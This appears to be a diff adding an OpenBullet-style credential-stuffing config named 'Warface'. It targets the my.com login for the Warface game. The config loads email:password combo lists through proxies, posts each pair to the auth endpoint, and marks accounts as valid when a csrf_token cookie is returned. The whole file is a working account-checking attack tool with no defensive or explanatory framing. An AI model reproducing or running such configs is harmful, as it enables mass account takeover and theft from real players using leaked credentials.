@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Warface",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-16T18:18:36.9008149+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_Page REQUEST GET "https://wf.my.com/en/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Login_POST REQUEST POST "https://auth-ac.my.com/auth" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&continue=https%3A%2F%2Faccount.my.com%2Flogin_continue%2F%3Flang%3Den_US%26client_id%3Dwf.my.com%26continue%3Dhttps%253A%252F%252Fwf.my.com%252F&failure=https%3A%2F%2Faccount.my.com%2Flogin%2F%3Flang%3Den_US%26client_id%3Dwf.my.com%26continue%3Dhttps%253A%252F%252Fwf.my.com%252F&nosavelogin=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://wf.my.com" 
+  HEADER "referer: https://wf.my.com/en/?_1lr=0-2520740_2008924" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "csrf_token" 
+  KEYCHAIN Failure OR 
+    KEY "<COOKIES{*}>" DoesNotContain "csrf_token" 
